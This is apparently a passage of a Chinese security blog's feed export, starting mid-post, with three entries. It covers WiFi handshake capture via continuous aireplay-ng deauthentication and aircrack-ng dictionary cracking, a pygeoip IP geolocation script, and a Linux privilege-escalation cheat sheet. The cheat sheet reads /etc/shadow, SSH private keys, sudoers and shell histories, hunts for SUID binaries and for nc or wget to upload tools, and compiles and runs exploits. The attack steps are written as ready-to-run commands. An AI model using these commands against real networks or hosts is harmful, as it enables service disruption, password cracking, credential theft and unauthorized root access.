src="https://img-blog.csdnimg.cn/20181109172131528.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pweWd4MTIz,size_16,color_FFFFFF,t_70" alt=""></p><p>可以看到有三个连接。</p><h2 id="洪水攻击（重复不断的攻击）"><a href="#洪水攻击（重复不断的攻击）" class="headerlink" title="洪水攻击（重复不断的攻击）"></a>洪水攻击（重复不断的攻击）</h2><pre><code>aireplay-ng -0 0 -a 0C:4B:54:AE:C1:06 -c CC:2F:71:8C:FA:4B wlan0mon</code></pre><p><strong>-0</strong>表示一直不断的攻击，类似于拒绝服务攻击，占满你的握手请求通道，其他的连接进不来，也可以让当前所有连接断开，-c在这里表示的是client的mac地址。</p><p>攻击的时候不要关闭抓包窗口，注意观察抓包窗口。</p><p><img src="https://img-blog.csdnimg.cn/20181109172327525.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pweWd4MTIz,size_16,color_FFFFFF,t_70" alt=""></p><p>过一会停掉洪水攻击，静等别人连接，出现<code>WPA handshake :</code>  ，就表示成功。如果有连接很快就可以抓到包</p><p><img src="https://img-blog.csdnimg.cn/20181109172929110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pweWd4MTIz,size_16,color_FFFFFF,t_70" alt=""></p><h2 id="抓包信息及爆破"><a href="#抓包信息及爆破" class="headerlink" title="抓包信息及爆破"></a>抓包信息及爆破</h2><p><img src="https://img-blog.csdnimg.cn/20181109173157234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pweWd4MTIz,size_16,color_FFFFFF,t_70" alt=""></p><p>抓到握手包那么就可以用密码字典进行爆破了，爆破的是.cap文件。</p><pre><code>aircrack-ng -w password.txt wlan0/qihua-01.cap</code></pre><p>接下来就静静等待跑包。</p><p><img src="https://img-blog.csdnimg.cn/20181109200738468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pweWd4MTIz,size_16,color_FFFFFF,t_70" alt=""></p><p>完成！密码51201314</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;WEP（有线等效保密）认证过程：&quot;&gt;&lt;a href=&quot;#WEP（有线等效保密）认证过程：&quot; class=&quot;headerlink&quot; title=&quot;WEP（有线等效保密）认证过程：&quot;&gt;&lt;/a&gt;WEP（有线等效保密）认证过程：&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;客户端向接入点发
      
    
    </summary>
    
      <category term="无线安全" scheme="http://yoursite.com/categories/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>GeoIP</title>
    <link href="http://yoursite.com/2018/12/11/GeoIP/"/>
    <id>http://yoursite.com/2018/12/11/GeoIP/</id>
    <published>2018-12-11T10:25:42.000Z</published>
    <updated>2018-12-11T10:28:42.549Z</updated>
    
    <content type="html"><![CDATA[<pre><code>import pygeoipgi = pygeoip.GeoIP(&apos;GeoLiteCity.dat&apos;)def printRecord(tgt):    rec = gi.record_by_name(tgt)    print(rec)    city = rec[&apos;city&apos;]    # region = rec[&apos;region_name&apos;]    country = rec[&apos;country_name&apos;]    long = rec[&apos;longitude&apos;]    lat = rec[&apos;latitude&apos;]    print(&apos;[*] Target: &apos; + tgt + &apos; Geo-located. &apos;)    print(&apos;[+] &apos; + str(city) + &apos;, &apos; + str(country))    print(&apos;[+] Latitude: &apos;+str(lat) + &apos;, Longitude: &apos; + str(long))tgt = &apos;114.242.146.98&apos;printRecord(tgt)</code></pre><p>GeoLiteCity.dat在网上可以免费下载。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;pre&gt;&lt;code&gt;import pygeoip
gi = pygeoip.GeoIP(&amp;apos;GeoLiteCity.dat&amp;apos;)
def printRecord(tgt):
    rec = gi.record_by_name(tgt)
    print(r
      
    
    </summary>
    
      <category term="python脚本" scheme="http://yoursite.com/categories/python%E8%84%9A%E6%9C%AC/"/>
    
    
  </entry>
  
  <entry>
    <title>Linux提权常用命令</title>
    <link href="http://yoursite.com/2018/12/07/Linux%E6%8F%90%E6%9D%83%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <id>http://yoursite.com/2018/12/07/Linux提权常用命令/</id>
    <published>2018-12-07T11:54:21.000Z</published>
    <updated>2018-12-07T13:13:52.631Z</updated>
    
    <content type="html"><![CDATA[<h1 id="操作系统相关"><a href="#操作系统相关" class="headerlink" title="操作系统相关"></a>操作系统相关</h1><h2 id="操作系统类型版本"><a href="#操作系统类型版本" class="headerlink" title="操作系统类型版本"></a>操作系统类型版本</h2><pre><code>cat /etc/issuecat /etc/*-releasecat /etc/lsb-release      # Debian cat /etc/redhat-release   # Redhat</code></pre><h2 id="内核版本-主要看是否为64位"><a href="#内核版本-主要看是否为64位" class="headerlink" title="内核版本(主要看是否为64位)"></a>内核版本(主要看是否为64位)</h2><pre><code>cat /proc/versionuname -auname -mrsrpm -q kerneldmesg | grep Linuxls /boot | grep vmlinuz-</code></pre><h2 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h2><pre><code>cat /etc/profilecat /etc/bashrccat ~/.bash_profilecat ~/.bashrccat ~/.bash_logoutenvset</code></pre><h2 id="查看是否有打印机"><a href="#查看是否有打印机" class="headerlink" title="查看是否有打印机"></a>查看是否有打印机</h2><pre><code>lpstat -a</code></pre><h1 id="应用与服务相关"><a href="#应用与服务相关" class="headerlink" title="应用与服务相关"></a>应用与服务相关</h1><h2 id="查看正在运行的程序及对应的用户权限"><a href="#查看正在运行的程序及对应的用户权限" class="headerlink" title="查看正在运行的程序及对应的用户权限"></a>查看正在运行的程序及对应的用户权限</h2><pre><code>ps auxps -eftopcat /etc/services</code></pre><h2 id="查看以root权限正在运行的程序"><a href="#查看以root权限正在运行的程序" class="headerlink" title="查看以root权限正在运行的程序"></a>查看以root权限正在运行的程序</h2><pre><code>ps aux | grep rootps -ef | grep root</code></pre><h2 id="查看安装了的应用"><a href="#查看安装了的应用" class="headerlink" title="查看安装了的应用"></a>查看安装了的应用</h2><pre><code>ls -alh /usr/bin/ls -alh /sbin/dpkg -lrpm -qals -alh /var/cache/apt/archivesls -alh /var/cache/yum/</code></pre><h2 id="一些服务的配置文件"><a href="#一些服务的配置文件" class="headerlink" title="一些服务的配置文件"></a>一些服务的配置文件</h2><pre><code>cat /etc/syslog.confcat /etc/chttp.confcat /etc/lighttpd.confcat /etc/cups/cupsd.confcat /etc/inetd.confcat /etc/apache2/apache2.confcat /etc/my.confcat /etc/httpd/conf/httpd.confcat /opt/lampp/etc/httpd.confls -aRl /etc/ | awk &apos;$1 ~ /^.*r.*/&apos;</code></pre><h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2><pre><code>crontab -lls -alh /var/spool/cronls -al /etc/ | grep cronls -al /etc/cron*cat /etc/cron*cat /etc/at.allowcat /etc/at.denycat /etc/cron.allowcat /etc/cron.denycat /etc/crontabcat /etc/anacrontabcat /var/spool/cron/crontabs/root</code></pre><h2 id="找存储的明文用户名，密码"><a href="#找存储的明文用户名，密码" class="headerlink" title="找存储的明文用户名，密码"></a>找存储的明文用户名，密码</h2><pre><code>grep -i user [filename]grep -i pass [filename]grep -C 5 &quot;password&quot; [filename]find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot;   # Joomla</code></pre><h1 id="通信与网络相关"><a href="#通信与网络相关" class="headerlink" title="通信与网络相关"></a>通信与网络相关</h1><h2 id="查看当前网络地址"><a href="#查看当前网络地址" class="headerlink" title="查看当前网络地址"></a>查看当前网络地址</h2><pre><code>/sbin/ifconfig -acat /etc/network/interfacescat /etc/sysconfig/network</code></pre><h2 id="查看网络配置，DNS，DHCP，网关"><a href="#查看网络配置，DNS，DHCP，网关" class="headerlink" title="查看网络配置，DNS，DHCP，网关"></a>查看网络配置，DNS，DHCP，网关</h2><pre><code>cat /etc/resolv.confcat /etc/sysconfig/networkcat /etc/networksiptables -Lhostnamednsdomainname</code></pre><h2 id="查看网络通信"><a href="#查看网络通信" class="headerlink" title="查看网络通信"></a>查看网络通信</h2><pre><code>lsof -ilsof -i :80grep 80 /etc/servicesnetstat -antupnetstat -antpxnetstat -tulpnchkconfig --listchkconfig --list | grep 3:onlastw</code></pre><h2 id="查看缓存"><a href="#查看缓存" class="headerlink" title="查看缓存"></a>查看缓存</h2><pre><code>arp -eroute/sbin/route -nee</code></pre><h2 id="tcpdump-网络上的数据包进行截获的包分析工具"><a href="#tcpdump-网络上的数据包进行截获的包分析工具" class="headerlink" title="tcpdump(网络上的数据包进行截获的包分析工具)"></a>tcpdump(网络上的数据包进行截获的包分析工具)</h2><pre><code>tcpdump 默认启动tcpdump -i eth1 监视指定网络接口的数据包tcpdump host 210.27.48.1  接货所有210.27.48.1的主机收到和发出的数据包</code></pre><p>具体用法：<a href="https://www.cnblogs.com/ggjucheng/archive/2012/01/14/2322659.html" target="_blank" rel="noopener">https://www.cnblogs.com/ggjucheng/archive/2012/01/14/2322659.html</a></p><h1 id="用户相关"><a href="#用户相关" class="headerlink" title="用户相关"></a>用户相关</h1><pre><code>idwhowlastcat /etc/passwdcat /etc/groupcat /etc/shadowls -alh /var/mail/grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &apos;$3 == 0 { print $1}&apos;   # 列出超级用户awk -F: &apos;($3 == &quot;0&quot;) {print}&apos; /etc/passwd   #列出超级用户cat /etc/sudoerssudo -l</code></pre><h2 id="列家目录"><a href="#列家目录" class="headerlink" title="列家目录"></a>列家目录</h2><pre><code>ls -ahlR /root/ls -ahlR /home/</code></pre><h2 id="从配置文件里面寻找密码"><a href="#从配置文件里面寻找密码" class="headerlink" title="从配置文件里面寻找密码"></a>从配置文件里面寻找密码</h2><pre><code>cat /var/apache2/config.inccat /var/lib/mysql/mysql/user.MYDcat /root/anaconda-ks.cfg</code></pre><h2 id="看其他用户的操作记录"><a href="#看其他用户的操作记录" class="headerlink" title="看其他用户的操作记录"></a>看其他用户的操作记录</h2><pre><code>cat ~/.bash_historycat ~/.nano_historycat ~/.atftp_historycat ~/.mysql_historycat ~/.php_history</code></pre><h2 id="ssh私钥"><a href="#ssh私钥" class="headerlink" title="ssh私钥"></a>ssh私钥</h2><pre><code>cat ~/.ssh/authorized_keyscat ~/.ssh/identity.pubcat ~/.ssh/identitycat ~/.ssh/id_rsa.pubcat ~/.ssh/id_rsacat ~/.ssh/id_dsa.pubcat ~/.ssh/id_dsacat /etc/ssh/ssh_configcat /etc/ssh/sshd_configcat /etc/ssh/ssh_host_dsa_key.pubcat /etc/ssh/ssh_host_dsa_keycat /etc/ssh/ssh_host_rsa_key.pubcat /etc/ssh/ssh_host_rsa_keycat /etc/ssh/ssh_host_key.pubcat /etc/ssh/ssh_host_key</code></pre><h1 id="文件系统相关"><a href="#文件系统相关" class="headerlink" title="文件系统相关"></a>文件系统相关</h1><h2 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h2><pre><code>ls -alh /var/logls -alh /var/maills -alh /var/spoolls -alh /var/spool/lpdls -alh /var/lib/pgsqlls -alh /var/lib/mysqlcat /var/lib/dhcp3/dhclient.leases</code></pre><h2 id="查看网站文件"><a href="#查看网站文件" class="headerlink" title="查看网站文件"></a>查看网站文件</h2><pre><code>ls -alhR /var/www/ls -alhR /srv/www/htdocs/ls -alhR /usr/local/www/apache22/data/ls -alhR /opt/lampp/htdocs/ls -alhR /var/www/html/</code></pre><h2 id="常见日志文件"><a href="#常见日志文件" class="headerlink" title="常见日志文件"></a>常见日志文件</h2><pre><code>cat /etc/httpd/logs/access_logcat /etc/httpd/logs/access.logcat /etc/httpd/logs/error_logcat /etc/httpd/logs/error.logcat /var/log/apache2/access_logcat /var/log/apache2/access.logcat /var/log/apache2/error_logcat /var/log/apache2/error.logcat /var/log/apache/access_logcat /var/log/apache/access.logcat /var/log/auth.logcat /var/log/chttp.logcat /var/log/cups/error_logcat /var/log/dpkg.logcat /var/log/faillogcat /var/log/httpd/access_logcat /var/log/httpd/access.logcat /var/log/httpd/error_logcat /var/log/httpd/error.logcat /var/log/lastlogcat /var/log/lighttpd/access.logcat /var/log/lighttpd/error.logcat /var/log/lighttpd/lighttpd.access.logcat /var/log/lighttpd/lighttpd.error.logcat /var/log/messagescat /var/log/securecat /var/log/syslogcat /var/log/wtmpcat /var/log/xferlogcat /var/log/yum.logcat /var/run/utmpcat /var/webmin/miniserv.logcat /var/www/logs/access_logcat /var/www/logs/access.logls -alh /var/lib/dhcp3/ls -alh /var/log/postgresql/ls -alh /var/log/proftpd/ls -alh /var/log/samba/</code></pre><h2 id="文件挂载"><a href="#文件挂载" class="headerlink" title="文件挂载"></a>文件挂载</h2><pre><code>mountdf -hcat /etc/fstab</code></pre><h2 id="Find命令"><a href="#Find命令" class="headerlink" title="Find命令"></a>Find命令</h2><pre><code>find / -perm -1000 -type d 2&gt;/dev/null   # 只有目录所有者才可以更改删除find / -perm -g=s -type f 2&gt;/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.find / -perm -u=s -type f 2&gt;/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null    # SGID or SUIDfor i in `locate -r &quot;bin$&quot;`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2&gt;/dev/null; done    # 从下面几个位置: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin 或者其他的bin目录寻找 find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2&gt;/dev/null #从/，SGUD或者SUID开始查找，排除符号链接，深度为3个文件夹，显示详细的清单并去除错误信息</code></pre><h2 id="寻找可写目录"><a href="#寻找可写目录" class="headerlink" title="寻找可写目录"></a>寻找可写目录</h2><pre><code>find / -writable -type d 2&gt;/dev/null      # 可写目录find / -perm -222 -type d 2&gt;/dev/null     # 可写目录 find / -perm -o w -type d 2&gt;/dev/null     # 可写目录find / -perm -o x -type d 2&gt;/dev/null     # 可执行目录find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null   # 可写可执行目录</code></pre><h1 id="准备及攻击"><a href="#准备及攻击" class="headerlink" title="准备及攻击"></a>准备及攻击</h1><h2 id="查看语言支持"><a href="#查看语言支持" class="headerlink" title="查看语言支持"></a>查看语言支持</h2><pre><code>find / -name perl*find / -name python*find / -name gcc*find / -name cc</code></pre><h2 id="查看上传方式"><a href="#查看上传方式" class="headerlink" title="查看上传方式"></a>查看上传方式</h2><pre><code>find / -name wgetfind / -name nc*find / -name netcat*find / -name tftp*find / -name ftp</code></pre><h2 id="寻找exp"><a href="#寻找exp" class="headerlink" title="寻找exp"></a>寻找exp</h2><p><a href="http://www.google.com" target="_blank" rel="noopener"> http://www.google.com</a></p><h2 id="编译及运行exp"><a href="#编译及运行exp" class="headerlink" title="编译及运行exp"></a>编译及运行exp</h2><pre><code>which gccgcc exp.c -o expchmod +x exp./exp</code></pre><h1 id="提权辅助脚本"><a href="#提权辅助脚本" class="headerlink" title="提权辅助脚本"></a>提权辅助脚本</h1><p><a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="noopener">https://github.com/rebootuser/LinEnum</a></p><p><a href="www.securitysift.com/download/linuxprivchecker.py">www.securitysift.com/download/linuxprivchecker.py</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;操作系统相关&quot;&gt;&lt;a href=&quot;#操作系统相关&quot; class=&quot;headerlink&quot; title=&quot;操作系统相关&quot;&gt;&lt;/a&gt;操作系统相关&lt;/h1&gt;&lt;h2 id=&quot;操作系统类型版本&quot;&gt;&lt;a href=&quot;#操作系统类型版本&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
      <category term="内网渗透" scheme="http://yoursite.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
</feed>
